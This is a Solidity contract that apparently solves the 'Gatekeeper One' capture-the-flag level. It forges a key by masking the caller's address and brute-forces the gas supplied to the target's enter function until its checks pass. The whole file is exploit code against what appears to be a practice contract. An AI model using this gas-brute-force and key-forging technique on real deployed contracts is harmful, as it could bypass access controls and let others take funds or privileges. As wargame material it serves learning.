// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackGatekeeperOne {
  event Hacked(uint256 gasBrute);

  address owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function attack(address _gatekeeperAddr, uint256 _lowerGasBrute, uint256 _upperGasBrute) external {
    bytes8 key = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
    bool success;
    uint256 gasBrute;

    for (gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++) {
      (success, ) = address(_gatekeeperAddr).call{gas:(gasBrute + (8191 * 3))}(abi.encodeWithSignature("enter(bytes8)", key));
        if(success){
            break;
        }
    }

    require(success, "HACK FAILED");
    emit Hacked(gasBrute);
  }
}
